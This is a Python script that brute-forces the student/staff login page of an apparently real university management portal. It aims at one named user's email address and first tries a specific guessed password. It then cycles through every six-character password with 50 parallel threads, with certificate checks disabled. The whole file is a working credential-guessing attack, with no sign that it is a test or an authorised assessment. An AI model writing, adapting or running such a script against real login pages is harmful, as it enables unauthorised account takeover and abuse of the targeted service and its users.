import requests
from bs4 import BeautifulSoup
import string
import itertools
import time
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

LOGIN_URL = 'https://ums.mydsi.org/Login.aspx'
username = 'yogesh2020.rn@gmail.com'
role = 'Student'  # or 'Staff'

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0"
})


def get_login_tokens():
    resp = session.get(LOGIN_URL, verify=False)
    soup = BeautifulSoup(resp.text, 'html.parser')

    def get_value(name):
        field = soup.find('input', {'name': name})
        return field['value'] if field and field.has_attr('value') else ''

    fields = ['__VIEWSTATE', '__VIEWSTATEGENERATOR', '__EVENTTARGET', '__EVENTARGUMENT',
              '__VIEWSTATEENCRYPTED', 'LASTFOCUS', 'hfWidth', 'hfHeight', 'hfLoginMethod']
    return {name: get_value(name) for name in fields}


def login_attempt(password, base_data):
    data = base_data.copy()
    data.update({
        'rblRole': role,
        'txtUsername': username,
        'txtPassword': password,
        'btnLogin': 'Login'
    })
    try:
        resp = session.post(LOGIN_URL, data=data, verify=False)
        # Change this condition based on actual login failure/success page content
        if "invalid" not in resp.text.lower():
            return True, password, resp.text[:300]
    except Exception as e:
        print(f"Error for password {password}: {e}")
    return False, password, None


def main():
    base_data = get_login_tokens()

    # First check the specific password "4£0!6D"
    initial_password = "4#00!6D"
    success, pwd_found, snippet = login_attempt(initial_password, base_data)
    print(f"Trying {pwd_found} Success: {success}")
    if success:
        print(f"Password found: {pwd_found}")
        print(snippet)
        return  # Stop if password found

    # Continue with brute force if initial password is incorrect
    charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{}|;:,.<>?/"
    password_length = 6
    max_workers = 50  # Tune this for concurrency

    def password_generator():
        return (''.join(p) for p in itertools.product(charset, repeat=password_length))

    passwords = password_generator()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        start_time = time.time()
        for pwd in passwords:
            # Skip the initial password since it's already checked
            if pwd == initial_password:
                continue
            futures[executor.submit(login_attempt, pwd, base_data)] = pwd
            if len(futures) >= max_workers * 2:
                done, _ = wait(futures, return_when=FIRST_COMPLETED)
                for f in done:
                    success, pwd_found, snippet = f.result()
                    print(f"Trying {pwd_found} Success: {success}")
                    if success:
                        print(f"Password found: {pwd_found}")
                        print(snippet)
                        executor.shutdown(wait=False)
                        return
                    del futures[f]
                elapsed = time.time() - start_time
                if elapsed > 0:
                    print(f"Approx {len(futures)/elapsed:.2f} attempts/sec")
        for fut in as_completed(futures):
            success, pwd_found, snippet = fut.result()
            print(f"Trying {pwd_found} Success: {success}")
            if success:
                print(f"Password found: {pwd_found}")
                print(snippet)
                break


if __name__ == "__main__":
    main()
